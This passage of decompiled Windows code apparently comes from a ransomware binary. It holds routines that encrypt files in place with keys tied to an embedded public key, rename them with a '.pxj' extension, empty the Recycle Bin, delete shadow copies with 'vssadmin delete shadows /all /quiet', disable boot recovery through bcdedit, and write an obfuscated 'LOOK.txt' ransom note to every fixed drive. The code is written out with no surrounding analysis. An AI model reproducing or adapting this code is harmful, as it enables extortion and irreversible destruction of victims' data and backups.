  int v37; // [esp+14h] [ebp-24h]
  int v38; // [esp+18h] [ebp-20h]
  int v39; // [esp+18h] [ebp-20h]
  int v40; // [esp+1Ch] [ebp-1Ch]
  int v41; // [esp+1Ch] [ebp-1Ch]
  char v42; // [esp+20h] [ebp-18h]
  char v43; // [esp+21h] [ebp-17h]
  char v44; // [esp+22h] [ebp-16h]
  char v45; // [esp+24h] [ebp-14h] BYREF
  unsigned __int8 v46; // [esp+25h] [ebp-13h]
  unsigned __int8 v47; // [esp+26h] [ebp-12h]
  char v48; // [esp+27h] [ebp-11h]
  unsigned __int8 v49[4]; // [esp+28h] [ebp-10h] BYREF
  int v50; // [esp+34h] [ebp-4h]

  v7 = 0;
  v50 = 1;
  v8 = a6;
  v9 = 0;
  a1[5] = 15;
  a1[4] = 0;
  v40 = 0;
  v38 = 0;
  for ( *(_BYTE *)a1 = 0; v8; v10[v8] ^= 0xEu )
  {
    v10 = a2;
    --v8;
    if ( a7 < 0x10 )
      v10 = &a2;
  }
  v37 = a6;
  if ( a6 )
  {
    while ( 1 )
    {
      --v37;
      v11 = a2;
      if ( a7 < 0x10 )
        v11 = &a2;
      if ( v11[v7] == 61 )
        break;
      v12 = a2;
      if ( a7 < 0x10 )
        v12 = &a2;
      v13 = v12[v7];
      if ( !isalnum(v13) && v13 != 43 && v13 != 47 )
        break;
      v14 = a2;
      if ( a7 < 0x10 )
        v14 = &a2;
      *(&v45 + v9++) = v14[v38];
      v40 = v9;
      ++v38;
      if ( v9 == 4 )
      {
        for ( i = 0; i < 4; ++i )
        {
          v49[0] = *(&v45 + i);
          *(&v45 + i) = sub_4012B0(v49, &Buf);
        }
        v42 = 4 * v45 + ((v46 >> 4) & 3);
        v43 = (16 * v46) ^ (v47 >> 2) & 0xF;
        v16 = 0;
        v44 = v48 + (v47 << 6);
        v41 = 0;
        while ( 1 )
        {
          v17 = a1[4];
          v18 = *(&v42 + v16);
          if ( v17 == -1 || v17 == -2 || (v19 = v17 + 1, v17 == -2) )
LABEL_42:
            std::_Xlength_error("string too long");
          v20 = a1[5];
          if ( v20 < v19 )
            break;
          v21 = v19 == 0;
          if ( v17 == -1 )
          {
            a1[4] = 0;
            if ( v20 < 0x10 )
              v22 = a1;
            else
              v22 = (_BYTE *)*a1;
            *v22 = 0;
            goto LABEL_29;
          }
LABEL_30:
          if ( !v21 )
          {
            if ( (unsigned int)a1[5] < 0x10 )
              v23 = a1;
            else
              v23 = (int *)*a1;
            *((_BYTE *)v23 + a1[4]) = v18;
            v24 = (unsigned int)a1[5] < 0x10;
            a1[4] = v19;
            if ( v24 )
              v25 = a1;
            else
              v25 = (int *)*a1;
            *((_BYTE *)v25 + v19) = 0;
          }
          v41 = ++v16;
          if ( v16 >= 3 )
          {
            v40 = 0;
            v9 = 0;
            goto LABEL_40;
          }
        }
        sub_4014E0((const void **)a1, v17 + 1, a1[4]);
        v16 = v41;
LABEL_29:
        v21 = v19 == 0;
        goto LABEL_30;
      }
LABEL_40:
      if ( !v37 )
        break;
      v7 = v38;
    }
    if ( v9 )
    {
      if ( v9 < 4 )
        memset(&v45 + v9, 0, 4 - v9);
      for ( j = 0; j < 4; ++j )
      {
        v49[0] = *(&v45 + j);
        *(&v45 + j) = sub_4012B0(v49, &Buf);
      }
      v42 = 4 * v45 + ((v46 >> 4) & 3);
      v44 = v48 + (v47 << 6);
      v43 = (16 * v46) ^ (v47 >> 2) & 0xF;
      v27 = 0;
      v39 = 0;
      if ( v40 - 1 > 0 )
      {
        while ( 1 )
        {
          v28 = a1[4];
          v29 = *(&v42 + v27);
          if ( v28 == -1 || v28 == -2 )
            goto LABEL_42;
          v30 = v28 + 1;
          if ( v28 == -2 )
            goto LABEL_42;
          v31 = a1[5];
          if ( v31 < v30 )
            break;
          v32 = v30 == 0;
          if ( v28 == -1 )
          {
            a1[4] = 0;
            if ( v31 < 0x10 )
              v33 = a1;
            else
              v33 = (_BYTE *)*a1;
            *v33 = 0;
            goto LABEL_58;
          }
LABEL_59:
          if ( !v32 )
          {
            if ( (unsigned int)a1[5] < 0x10 )
              v34 = a1;
            else
              v34 = (_BYTE *)*a1;
            v34[a1[4]] = v29;
            v24 = (unsigned int)a1[5] < 0x10;
            a1[4] = v30;
            if ( v24 )
              v35 = a1;
            else
              v35 = (_BYTE *)*a1;
            v35[v30] = 0;
          }
          v39 = ++v27;
          if ( v27 >= v40 - 1 )
            goto LABEL_68;
        }
        sub_4014E0((const void **)a1, v28 + 1, a1[4]);
        v27 = v39;
LABEL_58:
        v32 = v30 == 0;
        goto LABEL_59;
      }
    }
  }
LABEL_68:
  if ( a7 >= 0x10 )
    operator delete(a2);
  return a1;
}
// 404650: using guessed type unsigned __int8 var_10[4];

//----- (00404980) --------------------------------------------------------
void __usercall sub_404980(void **a1@<ebx>)
{
  void **v1; // esi
  void *v2; // edi

  while ( 1 )
  {
    v1 = (void **)*a1;
    if ( !*a1 )
      break;
    v2 = *v1;
    if ( v1[1] )
      operator delete(v1[1]);
    *v1 = 0;
    v1[1] = 0;
    operator delete(v1);
    *a1 = v2;
  }
}

//----- (004049C0) --------------------------------------------------------
char __userpurge sub_4049C0@<al>(_DWORD *a1@<ebx>, wchar_t *Source)
{
  void *v2; // esi
  int v3; // eax
  rsize_t v4; // edi
  _DWORD *v5; // eax

  v2 = operator new(8u);
  if ( !v2 )
    return 0;
  *(_DWORD *)v2 = 0;
  *((_DWORD *)v2 + 1) = 0;
  v3 = wcslen(Source);
  if ( v3 < 0 )
    return 0;
  v4 = v3 + 1;
  v5 = operator new[](2 * (v3 + 1));
  *((_DWORD *)v2 + 1) = v5;
  *v5 = 0;
  wcsncpy_s(*((wchar_t **)v2 + 1), v4, Source, 0x104u);
  *(_DWORD *)v2 = *a1;
  *a1 = v2;
  return 1;
}

//----- (00404A50) --------------------------------------------------------
int __usercall sub_404A50@<eax>(int a1@<esi>)
{
  unsigned int v1; // eax
  DWORD nSize; // [esp+4h] [ebp-4h] BYREF

  *(_DWORD *)(a1 + 780) = 0;
  *(_DWORD *)(a1 + 784) = 0;
  wcscpy_s((wchar_t *)a1, 0x104u, &word_41748C);
  memset((void *)(a1 + 520), 0, 0x104u);
  nSize = 260;
  if ( !GetComputerNameA((LPSTR)(a1 + 520), &nSize) )
  {
    v1 = sub_401730(0, 0x64u);
    sub_406870((char *)(a1 + 520), "COM_%d", v1);
  }
  return a1;
}

//----- (00404AD0) --------------------------------------------------------
bool __usercall sub_404AD0@<al>(int a1@<ebx>)
{
  HANDLE FileW; // eax
  HANDLE v2; // edi
  _DWORD *v3; // esi
  unsigned int v5; // eax
  bool v6; // cf
  void *v7; // eax
  _WORD *v8; // eax
  int v10[407]; // [esp-648h] [ebp-51E8h] BYREF
  int FileSize; // [esp+14h] [ebp-4B8Ch]
  int v12; // [esp+18h] [ebp-4B88h]
  int v13; // [esp+1Ch] [ebp-4B84h]
  DWORD FileSizeHigh; // [esp+20h] [ebp-4B80h] BYREF
  DWORD NumberOfBytesRead; // [esp+24h] [ebp-4B7Ch] BYREF
  DWORD NumberOfBytesWritten; // [esp+28h] [ebp-4B78h] BYREF
  HANDLE hFile; // [esp+2Ch] [ebp-4B74h]
  int v18[402]; // [esp+30h] [ebp-4B70h] BYREF
  int v19[121]; // [esp+678h] [ebp-4528h] BYREF
  void *v20[5]; // [esp+85Ch] [ebp-4344h] BYREF
  unsigned int v21; // [esp+870h] [ebp-4330h]
  char Buffer[8192]; // [esp+878h] [ebp-4328h] BYREF
  char v23[8192]; // [esp+2878h] [ebp-2328h] BYREF
  wchar_t Destination[260]; // [esp+4878h] [ebp-328h] BYREF
  char v25[272]; // [esp+4A80h] [ebp-120h] BYREF
  int v26; // [esp+4B9Ch] [ebp-4h]

  FileW = CreateFileW((LPCWSTR)(a1 + 812), 0xC0000000, 0, 0, 3u, 0x80u, 0);
  hFile = FileW;
  if ( FileW == (HANDLE)-1 )
    return 0;
  FileSizeHigh = 0;
  FileSize = GetFileSize(FileW, &FileSizeHigh);
  v12 = 0;
  v13 = FileSizeHigh;
  memset(Buffer, 0, sizeof(Buffer));
  memset(v23, 0, sizeof(v23));
  NumberOfBytesRead = 0;
  NumberOfBytesWritten = 0;
  sub_406210(v19, (unsigned __int8 *)(a1 + 1332));
  v20[4] = 0;
  v21 = 15;
  LOBYTE(v20[0]) = 0;
  sub_401330(
    "AAABANIx93RdufO4zt0lNafMUqQga5VT38C60smuF6KQa8qLRq4D3XrnLJVuqO1e5+hTnU0tQ5EfQPzZ281kLWXls+cfZMExvPjSKDGOOVnl+//orxBO"
    "gOUpnRirhDoD/rrKCX9lmXzqkXwjovlbMDlShS6XHdBaPNIyo1OUpC+SvaUK6L+xIR5a9iksUc/bvxy0VHOjAsS5jzh64Ygmn1mqb71QrZ6/gLylNHTk"
    "FF/GfTmK+hJyoEvowoiJ4cJY0YzYM9HgQcCpka2ziy1nx9wgdAm4c4q5yLNDfFuobacdlfuUE9a1vpNnbcOAOeA9xH6Wl91VsvEUa5SHWqF8Kryp/n3+8w==",
    0x160u,
    (int)v20);
  v26 = 0;
  sub_4017B0((char *)v18);
  v10[406] = (int)v10;
  sub_401980(v18, (char *)v10);
  sub_401A00(a1 + 1332, 0x40u, v10[0], v10[1]);
  if ( v21 >= 0x10 )
    operator delete(v20[0]);
  v2 = hFile;
  v3 = (_DWORD *)(a1 + 1408);
  if ( !SetFilePointerEx(hFile, (LARGE_INTEGER)((*(_DWORD *)(a1 + 1408) + 1) << 24), 0, 0) )
  {
    CloseHandle(v2);
    return 0;
  }
  if ( ReadFile(v2, Buffer, 0x2000u, &NumberOfBytesRead, 0) )
  {
    do
    {
      if ( !NumberOfBytesRead )
        break;
      if ( !SetFilePointerEx(hFile, (LARGE_INTEGER)-NumberOfBytesRead, 0, 1u) )
        break;
      v5 = sub_405EF0(NumberOfBytesRead, (int)v23, v19, (int)Buffer);
      if ( !WriteFile(hFile, v23, v5, &NumberOfBytesWritten, 0) || !NumberOfBytesWritten || NumberOfBytesRead < 0x2000 )
        break;
      v6 = __CFADD__((*v3)++, 1);
      v7 = *(void **)(a1 + 808);
      *(_DWORD *)(a1 + 1412) += v6;
      if ( v7 != (void *)-1 )
      {
        SetFilePointerEx(v7, 0i64, 0, 0);
        SetEndOfFile(*(HANDLE *)(a1 + 808));
        v8 = (_WORD *)(a1 + 812);
        while ( *v8++ )
          ;
        WriteFile(*(HANDLE *)(a1 + 808), (LPCVOID)(a1 + 812), 2 * (((int)v8 - a1 - 814) >> 1), &NumberOfBytesWritten, 0);
        WriteFile(*(HANDLE *)(a1 + 808), L"\r\n", 4u, &NumberOfBytesWritten, 0);
        WriteFile(*(HANDLE *)(a1 + 808), (LPCVOID)(a1 + 1332), 0x40u, &NumberOfBytesWritten, 0);
        WriteFile(*(HANDLE *)(a1 + 808), L"\r\n", 4u, &NumberOfBytesWritten, 0);
        WriteFile(*(HANDLE *)(a1 + 808), (LPCVOID)(a1 + 1408), 8u, &NumberOfBytesWritten, 0);
      }
    }
    while ( SetFilePointerEx(hFile, (LARGE_INTEGER)16769024i64, 0, 1u)
         && ReadFile(hFile, Buffer, 0x2000u, &NumberOfBytesRead, 0) );
  }
  sub_405DC0(v25, hFile, FileSize, v13);
  wcsncpy_s(Destination, 0x104u, (const wchar_t *)(a1 + 812), 0x104u);
  wcsncat_s(Destination, 0x104u, L".pxj", 0x104u);
  CloseHandle(hFile);
  v10[401] = 0;
  v10[400] = 0;
  SetFilePointerEx(*(HANDLE *)(a1 + 808), 0i64, 0, 0);
  SetEndOfFile(*(HANDLE *)(a1 + 808));
  return _wrename((const wchar_t *)(a1 + 812), Destination) == 0;
}
// 404AD0: using guessed type int var_4528[121];
// 404AD0: using guessed type int var_4B70[402];
// 404AD0: using guessed type char var_120[272];

//----- (00404F10) --------------------------------------------------------
bool __stdcall sub_404F10(int a1, wchar_t *lpFileName, unsigned __int64 a3)
{
  HANDLE FileW; // ebx
  int i; // esi
  HANDLE v6; // esi
  unsigned int v7; // eax
  int v8; // ebx
  void *v9; // eax
  wchar_t *v10; // esi
  int v11[406]; // [esp-648h] [ebp-5240h] BYREF
  int v12; // [esp+10h] [ebp-4BE8h]
  wchar_t *Source; // [esp+14h] [ebp-4BE4h]
  __int64 v14; // [esp+18h] [ebp-4BE0h] BYREF
  HANDLE hFile; // [esp+24h] [ebp-4BD4h]
  unsigned __int64 v16; // [esp+28h] [ebp-4BD0h]
  DWORD NumberOfBytesRead; // [esp+30h] [ebp-4BC8h] BYREF
  DWORD NumberOfBytesWritten; // [esp+34h] [ebp-4BC4h] BYREF
  int v19[402]; // [esp+38h] [ebp-4BC0h] BYREF
  int v20[121]; // [esp+680h] [ebp-4578h] BYREF
  void *v21[5]; // [esp+864h] [ebp-4394h] BYREF
  unsigned int v22; // [esp+878h] [ebp-4380h]
  char Buffer[8192]; // [esp+880h] [ebp-4378h] BYREF
  char v24[8192]; // [esp+2880h] [ebp-2378h] BYREF
  wchar_t Destination[260]; // [esp+4880h] [ebp-378h] BYREF
  char v26[272]; // [esp+4A88h] [ebp-170h] BYREF
  unsigned __int8 v27[80]; // [esp+4B98h] [ebp-60h] BYREF
  int v28; // [esp+4BF4h] [ebp-4h]

  v12 = a1;
  Source = lpFileName;
  FileW = CreateFileW(lpFileName, 0xC0000000, 0, 0, 3u, 0x80u, 0);
  hFile = FileW;
  if ( FileW == (HANDLE)-1 )
    return 0;
  if ( sub_405E50(FileW, a3) )
  {
    CloseHandle(FileW);
    return 1;
  }
  memset(Buffer, 0, sizeof(Buffer));
  memset(v24, 0, sizeof(v24));
  NumberOfBytesRead = 0;
  NumberOfBytesWritten = 0;
  for ( i = 0; i < 64; ++i )
    v27[i] = sub_401730(0, 0xFFFFFFFF);
  sub_406210(v20, v27);
  v22 = 15;
  v21[4] = 0;
  LOBYTE(v21[0]) = 0;
  sub_401330(
    "AAABANIx93RdufO4zt0lNafMUqQga5VT38C60smuF6KQa8qLRq4D3XrnLJVuqO1e5+hTnU0tQ5EfQPzZ281kLWXls+cfZMExvPjSKDGOOVnl+//orxBO"
    "gOUpnRirhDoD/rrKCX9lmXzqkXwjovlbMDlShS6XHdBaPNIyo1OUpC+SvaUK6L+xIR5a9iksUc/bvxy0VHOjAsS5jzh64Ygmn1mqb71QrZ6/gLylNHTk"
    "FF/GfTmK+hJyoEvowoiJ4cJY0YzYM9HgQcCpka2ziy1nx9wgdAm4c4q5yLNDfFuobacdlfuUE9a1vpNnbcOAOeA9xH6Wl91VsvEUa5SHWqF8Kryp/n3+8w==",
    0x160u,
    (int)v21);
  v28 = 0;
  sub_4017B0((char *)v19);
  HIDWORD(v16) = v11;
  sub_401980(v19, (char *)v11);
  sub_401A00((int)v27, 0x40u, v11[0], v11[1]);
  if ( v22 >= 0x10 )
    operator delete(v21[0]);
  v6 = hFile;
  if ( !SetFilePointerEx(hFile, 0i64, 0, 0) )
  {
    CloseHandle(v6);
    return 0;
  }
  v16 = 0i64;
  v14 = 0i64;
  while ( ReadFile(v6, Buffer, 0x2000u, &NumberOfBytesRead, 0) )
  {
    if ( !NumberOfBytesRead )
      break;
    if ( !SetFilePointerEx(v6, (LARGE_INTEGER)-NumberOfBytesRead, 0, 1u) )
      break;
    v7 = sub_405EF0(NumberOfBytesRead, (int)v24, v20, (int)Buffer);
    if ( !WriteFile(v6, v24, v7, &NumberOfBytesWritten, 0) || !NumberOfBytesWritten || NumberOfBytesRead < 0x2000 )
      break;
    if ( v16 < 0x800 )
    {
      ++v16;
    }
    else
    {
      ++v14;
      v8 = v12;
      v9 = *(void **)(v12 + 808);
      if ( v9 != (void *)-1 )
      {
        SetFilePointerEx(v9, 0i64, 0, 0);
        SetEndOfFile(*(HANDLE *)(v8 + 808));
        WriteFile(*(HANDLE *)(v8 + 808), Source, 2 * wcslen(Source), &NumberOfBytesWritten, 0);
        WriteFile(*(HANDLE *)(v8 + 808), L"\r\n", 4u, &NumberOfBytesWritten, 0);
        WriteFile(*(HANDLE *)(v8 + 808), v27, 0x40u, &NumberOfBytesWritten, 0);
        WriteFile(*(HANDLE *)(v8 + 808), L"\r\n", 4u, &NumberOfBytesWritten, 0);
        WriteFile(*(HANDLE *)(v8 + 808), &v14, 8u, &NumberOfBytesWritten, 0);
        v6 = hFile;
      }
      if ( !SetFilePointerEx(v6, (LARGE_INTEGER)16769024i64, 0, 1u) )
        goto LABEL_25;
    }
  }
  v8 = v12;
LABEL_25:
  sub_405DC0(v26, v6, a3, SHIDWORD(a3));
  v10 = Source;
  wcsncpy_s(Destination, 0x104u, Source, 0x104u);
  wcsncat_s(Destination, 0x104u, L".pxj", 0x104u);
  CloseHandle(hFile);
  SetFilePointerEx(*(HANDLE *)(v8 + 808), 0i64, 0, 0);
  SetEndOfFile(*(HANDLE *)(v8 + 808));
  return _wrename(v10, Destination) == 0;
}
// 404F10: using guessed type unsigned __int8 var_60[80];
// 404F10: using guessed type int var_4578[121];
// 404F10: using guessed type int var_4BC0[402];
// 404F10: using guessed type char var_170[272];
// 404F10: using guessed type __int64 var_4BE0;

//----- (00405370) --------------------------------------------------------
char __stdcall sub_405370(wchar_t *a1)
{
  HANDLE FileW; // ebx
  int *v2; // eax
  int *v3; // eax
  wchar_t *v4; // edi
  int v5; // esi
  UINT DriveTypeW; // eax
  HANDLE v7; // ebx
  int *v8; // eax
  int *v9; // eax
  void *v11; // [esp-28h] [ebp-354h] BYREF
  int v12; // [esp-24h] [ebp-350h]
  int v13; // [esp-20h] [ebp-34Ch]
  void *v14; // [esp-1Ch] [ebp-348h] BYREF
  int v15; // [esp-18h] [ebp-344h]
  int v16; // [esp-14h] [ebp-340h]
  int v17; // [esp-10h] [ebp-33Ch]
  unsigned int v18; // [esp-Ch] [ebp-338h]
  unsigned int p_NumberOfBytesWritten; // [esp-8h] [ebp-334h]
  LPOVERLAPPED v20; // [esp-4h] [ebp-330h]
  void **v21; // [esp+10h] [ebp-31Ch]
  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-318h] BYREF
  int v23; // [esp+18h] [ebp-314h]
  wchar_t *Source; // [esp+1Ch] [ebp-310h]
  DWORD LogicalDrives; // [esp+20h] [ebp-30Ch]
  void *v26[7]; // [esp+24h] [ebp-308h] BYREF
  void *v27[5]; // [esp+40h] [ebp-2ECh] BYREF
  unsigned int v28; // [esp+54h] [ebp-2D8h]
  void *v29[5]; // [esp+5Ch] [ebp-2D0h] BYREF
  unsigned int v30; // [esp+70h] [ebp-2BCh]
  void *v31[5]; // [esp+78h] [ebp-2B4h] BYREF
  unsigned int v32; // [esp+8Ch] [ebp-2A0h]
  WCHAR pszPath[260]; // [esp+94h] [ebp-298h] BYREF
  WCHAR RootPathName; // [esp+29Ch] [ebp-90h] BYREF
  int v35; // [esp+29Eh] [ebp-8Eh]
  __int16 v36; // [esp+2A2h] [ebp-8Ah]
  char v37[120]; // [esp+2A4h] [ebp-88h] BYREF
  int v38; // [esp+328h] [ebp-4h]

  Source = a1;
  SHEmptyRecycleBinW(0, 0, 7u);
  WinExec("vssadmin.exe delete shadows /all /quiet", 0);
  WinExec("bcdedit.exe /set {default} recoveryenabled no", 0);
  WinExec("bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures", 0);
  WinExec("bcdedit.exe /set {current} recoveryenabled no", 0);
  WinExec("bcdedit.exe /set {current} bootstatuspolicy ignoreallfailures", 0);
  NumberOfBytesWritten = 0;
  if ( SHGetSpecialFolderPathW(0, pszPath, 0, 0) )
  {
    wcscat_s(pszPath, 0x104u, asc_418C50);
    wcscat_s(pszPath, 0x104u, L"LOOK.txt");
    FileW = CreateFileW(pszPath, 0xC0000000, 0, 0, 2u, 0x80u, 0);
    if ( FileW != (HANDLE)-1 )
    {
      v18 = 0;
      p_NumberOfBytesWritten = 15;
      LogicalDrives = (DWORD)&v14;
      LOBYTE(v14) = 0;
      sub_401330(
        "]IX}lI6{J_a@MeH}lML;l=XwGIT~lIXtGIv~o<[imIfxjI7tBMLeWV\\fWcHtTVC}GFT~TIXxmwyiTI7djY?bl`\\tGIH{TMLxjIfbmgL~lVLxm`"
        "\\fl`\\tGIHwT]Lblc@wkVL>TY_ij<b>oMLtjFDxlcjbm=_iTY;dm`byjIbxlgLflc_ijY;~mVXbGIzbk]:@Mb\\aT]Lxlcv;GI?bjIfxTMLxTgL"
        "wTY@xjcXwoY;`GIT~lIXtGIbtGF\\xGFL?mc@aWV@bGI\\bW=D;mF_ijI7xlMLflc_ijY;~mVXbGIzbk]Lcl=GikY7?Bi>EJ_~FjYHwWY;>TY[8J"
        "_~Tl=[iW<H{GF@blc_il<;bGI7cGFbxjVGiTY;dm`byjIXeGIT~lI[iT`Dxl]L;l=XwGHLJGIH{TML=T]LeTY@wkVL>GIb>GITxmgLcmcXbBi>E_"
        "`X>GFjbGI@flgLeTY@wkVL>GI7{lFeil<;bGITxmgLcmcXbBgLIoYvbGI??m=_ilc7>GI@xl`\\foY:ijcH}jYHglI[ioY;cl=DzWV\\~l<:{J_a"
        "@MebcGFbxj]LelwL{l=_iW<7{jIHdjML?mwL=oV\\aoY:iCwLeWVbtBML>oI[imFD~W<[ij<b}lMLel=XglI[iTVTbm`eiTIH;Bi>E_Y;eGIbcGF"
        "bxj]LelwL{l=_iT<X>GIb{GF\\xjY@aGITxmgLfGFjbTY}}GFbxjVGiTcb}TVCij<b}lMLgT]L}l=@>GITxmcX<TVG{J_a@Me7?mgLzWYb}GIHeT"
        "FDbm=C8J_~:jcT:T=mtAZG;_FLwl=\\xlc?foYy{W<7zJ_a@MbDbm<XwjcXeGI?foYyiWY\\emcXtmta@M`f<T`f`jtGvC>LeTY@xkY?foYy{W<7z",
        0x374u,
        (int)&v14);
      v2 = sub_404650((int *)v26, v14, v15, v16, v17, v18, p_NumberOfBytesWritten);
      v38 = 0;
      if ( (unsigned int)v2[5] >= 0x10 )
        v2 = (int *)*v2;
      v18 = strlen((const char *)v2);
      v20 = 0;
      p_NumberOfBytesWritten = (unsigned int)&NumberOfBytesWritten;
      v15 = 0;
      v16 = 15;
      LogicalDrives = (DWORD)&v11;
      LOBYTE(v11) = 0;
      sub_401330(
        "]IX}lI6{J_a@MeH}lML;l=XwGIT~lIXtGIv~o<[imIfxjI7tBMLeWV\\fWcHtTVC}GFT~TIXxmwyiTI7djY?bl`\\tGIH{TMLxjIfbmgL~lVLxm`"
        "\\fl`\\tGIHwT]Lblc@wkVL>TY_ij<b>oMLtjFDxlcjbm=_iTY;dm`byjIbxlgLflc_ijY;~mVXbGIzbk]:@Mb\\aT]Lxlcv;GI?bjIfxTMLxTgL"
        "wTY@xjcXwoY;`GIT~lIXtGIbtGF\\xGFL?mc@aWV@bGI\\bW=D;mF_ijI7xlMLflc_ijY;~mVXbGIzbk]Lcl=GikY7?Bi>EJ_~FjYHwWY;>TY[8J"
        "_~Tl=[iW<H{GF@blc_il<;bGI7cGFbxjVGiTY;dm`byjIXeGIT~lI[iT`Dxl]L;l=XwGHLJGIH{TML=T]LeTY@wkVL>GIb>GITxmgLcmcXbBi>E_"
        "`X>GFjbGI@flgLeTY@wkVL>GI7{lFeil<;bGITxmgLcmcXbBgLIoYvbGI??m=_ilc7>GI@xl`\\foY:ijcH}jYHglI[ioY;cl=DzWV\\~l<:{J_a"
        "@MebcGFbxj]LelwL{l=_iW<7{jIHdjML?mwL=oV\\aoY:iCwLeWVbtBML>oI[imFD~W<[ij<b}lMLel=XglI[iTVTbm`eiTIH;Bi>E_Y;eGIbcGF"
        "bxj]LelwL{l=_iT<X>GIb{GF\\xjY@aGITxmgLfGFjbTY}}GFbxjVGiTcb}TVCij<b}lMLgT]L}l=@>GITxmcX<TVG{J_a@Me7?mgLzWYb}GIHeT"
        "FDbm=C8J_~:jcT:T=mtAZG;_FLwl=\\xlc?foYy{W<7zJ_a@MbDbm<XwjcXeGI?foYyiWY\\emcXtmta@M`f<T`f`jtGvC>LeTY@xkY?foYy{W<7z",
        0x374u,
        (int)&v11);
      v3 = sub_404650((int *)v31, v11, v12, v13, (int)v14, v15, v16);
      if ( (unsigned int)v3[5] >= 0x10 )
        v3 = (int *)*v3;
      WriteFile(FileW, v3, v18, (LPDWORD)p_NumberOfBytesWritten, v20);
      if ( v32 >= 0x10 )
        operator delete(v31[0]);
      v38 = -1;
      v32 = 15;
      v31[4] = 0;
      LOBYTE(v31[0]) = 0;
      if ( v26[5] >= (void *)0x10 )
        operator delete(v26[0]);
      CloseHandle(FileW);
    }
  }
  v4 = Source;
  if ( !wcscmp(Source, &word_41748C) )
  {
    v5 = 1;
    LogicalDrives = GetLogicalDrives();
    v23 = 1;
    while ( 1 )
    {
      if ( ((1 << v5) & LogicalDrives) != 0 )
      {
        RootPathName = v5 + 65;
        v35 = 6029370;
        v36 = 0;
        memset(v37, 0, sizeof(v37));
        DriveTypeW = GetDriveTypeW(&RootPathName);
        if ( DriveTypeW != 5 && DriveTypeW != 6 && DriveTypeW != 1 )
        {
          sub_4049C0((_DWORD *)v4 + 195, &RootPathName);
          wcscat_s(&RootPathName, 0x40u, L"LOOK.txt");
          v7 = CreateFileW(&RootPathName, 0xC0000000, 0, 0, 2u, 0x80u, 0);
          if ( v7 != (HANDLE)-1 )
          {
            v21 = &v14;
            sub_401240(
              "]IX}lI6{J_a@MeH}lML;l=XwGIT~lIXtGIv~o<[imIfxjI7tBMLeWV\\fWcHtTVC}GFT~TIXxmwyiTI7djY?bl`\\tGIH{TMLxjIfbmgL~"
              "lVLxm`\\fl`\\tGIHwT]Lblc@wkVL>TY_ij<b>oMLtjFDxlcjbm=_iTY;dm`byjIbxlgLflc_ijY;~mVXbGIzbk]:@Mb\\aT]Lxlcv;GI?"
              "bjIfxTMLxTgLwTY@xjcXwoY;`GIT~lIXtGIbtGF\\xGFL?mc@aWV@bGI\\bW=D;mF_ijI7xlMLflc_ijY;~mVXbGIzbk]Lcl=GikY7?Bi>"
              "EJ_~FjYHwWY;>TY[8J_~Tl=[iW<H{GF@blc_il<;bGI7cGFbxjVGiTY;dm`byjIXeGIT~lI[iT`Dxl]L;l=XwGHLJGIH{TML=T]LeTY@wk"
              "VL>GIb>GITxmgLcmcXbBi>E_`X>GFjbGI@flgLeTY@wkVL>GI7{lFeil<;bGITxmgLcmcXbBgLIoYvbGI??m=_ilc7>GI@xl`\\foY:ijc"
              "H}jYHglI[ioY;cl=DzWV\\~l<:{J_a@MebcGFbxj]LelwL{l=_iW<7{jIHdjML?mwL=oV\\aoY:iCwLeWVbtBML>oI[imFD~W<[ij<b}lM"
              "Lel=XglI[iTVTbm`eiTIH;Bi>E_Y;eGIbcGFbxj]LelwL{l=_iT<X>GIb{GF\\xjY@aGITxmgLfGFjbTY}}GFbxjVGiTcb}TVCij<b}lML"
              "gT]L}l=@>GITxmcX<TVG{J_a@Me7?mgLzWYb}GIHeTFDbm=C8J_~:jcT:T=mtAZG;_FLwl=\\xlc?foYy{W<7zJ_a@MbDbm<XwjcXeGI?f"
              "oYyiWY\\emcXtmta@M`f<T`f`jtGvC>LeTY@xkY?foYy{W<7z",
              (int)&v14);
            v8 = sub_404650((int *)v27, v14, v15, v16, v17, v18, p_NumberOfBytesWritten);
            v38 = 1;
            if ( (unsigned int)v8[5] >= 0x10 )
              v8 = (int *)*v8;
            v18 = strlen((const char *)v8);
            v20 = 0;
            p_NumberOfBytesWritten = (unsigned int)&NumberOfBytesWritten;
            v21 = &v11;
            sub_401240(
              "]IX}lI6{J_a@MeH}lML;l=XwGIT~lIXtGIv~o<[imIfxjI7tBMLeWV\\fWcHtTVC}GFT~TIXxmwyiTI7djY?bl`\\tGIH{TMLxjIfbmgL~"
              "lVLxm`\\fl`\\tGIHwT]Lblc@wkVL>TY_ij<b>oMLtjFDxlcjbm=_iTY;dm`byjIbxlgLflc_ijY;~mVXbGIzbk]:@Mb\\aT]Lxlcv;GI?"
              "bjIfxTMLxTgLwTY@xjcXwoY;`GIT~lIXtGIbtGF\\xGFL?mc@aWV@bGI\\bW=D;mF_ijI7xlMLflc_ijY;~mVXbGIzbk]Lcl=GikY7?Bi>"
              "EJ_~FjYHwWY;>TY[8J_~Tl=[iW<H{GF@blc_il<;bGI7cGFbxjVGiTY;dm`byjIXeGIT~lI[iT`Dxl]L;l=XwGHLJGIH{TML=T]LeTY@wk"
              "VL>GIb>GITxmgLcmcXbBi>E_`X>GFjbGI@flgLeTY@wkVL>GI7{lFeil<;bGITxmgLcmcXbBgLIoYvbGI??m=_ilc7>GI@xl`\\foY:ijc"
              "H}jYHglI[ioY;cl=DzWV\\~l<:{J_a@MebcGFbxj]LelwL{l=_iW<7{jIHdjML?mwL=oV\\aoY:iCwLeWVbtBML>oI[imFD~W<[ij<b}lM"
              "Lel=XglI[iTVTbm`eiTIH;Bi>E_Y;eGIbcGFbxj]LelwL{l=_iT<X>GIb{GF\\xjY@aGITxmgLfGFjbTY}}GFbxjVGiTcb}TVCij<b}lML"
              "gT]L}l=@>GITxmcX<TVG{J_a@Me7?mgLzWYb}GIHeTFDbm=C8J_~:jcT:T=mtAZG;_FLwl=\\xlc?foYy{W<7zJ_a@MbDbm<XwjcXeGI?f"
              "oYyiWY\\emcXtmta@M`f<T`f`jtGvC>LeTY@xkY?foYy{W<7z",
              (int)&v11);
            v9 = sub_404650((int *)v29, v11, v12, v13, (int)v14, v15, v16);
            if ( (unsigned int)v9[5] >= 0x10 )
              v9 = (int *)*v9;
            WriteFile(v7, v9, v18, (LPDWORD)p_NumberOfBytesWritten, v20);
            if ( v30 >= 0x10 )
              operator delete(v29[0]);
            v38 = -1;
            v30 = 15;
            v29[4] = 0;
            LOBYTE(v29[0]) = 0;
            if ( v28 >= 0x10 )
              operator delete(v27[0]);
            v28 = 15;
            v27[4] = 0;
            LOBYTE(v27[0]) = 0;
